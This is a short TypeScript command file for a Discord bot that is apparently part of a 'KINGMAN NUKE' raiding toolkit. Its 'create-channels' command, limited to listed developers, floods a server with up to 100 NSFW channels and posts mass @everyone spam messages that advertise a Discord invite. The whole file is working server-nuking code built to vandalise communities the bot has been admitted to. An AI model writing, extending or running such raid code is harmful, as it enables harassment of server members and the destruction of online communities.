import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "create-channels",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        let ops = { 
            channels: {
                name: "kingman",
                nsfw: true,
                number: Number(args[0]) || 100,
                topic: "KINGMAN HERE SAY GOODNIGHT :)"
            },
            messages: {
                content: args.slice(2).join(" ") || "> @everyone **KINGMAN NUKE SYSTEM [KINGMAN_DEV](https://discord.gg/kingmandev)**",
                number: Number(args[1]) || 25
            }
        }
        await kingman.CreateChannels(kmsg.guild, ops).catch(e=> {
            console.log(e)
        })
    } 
} as Command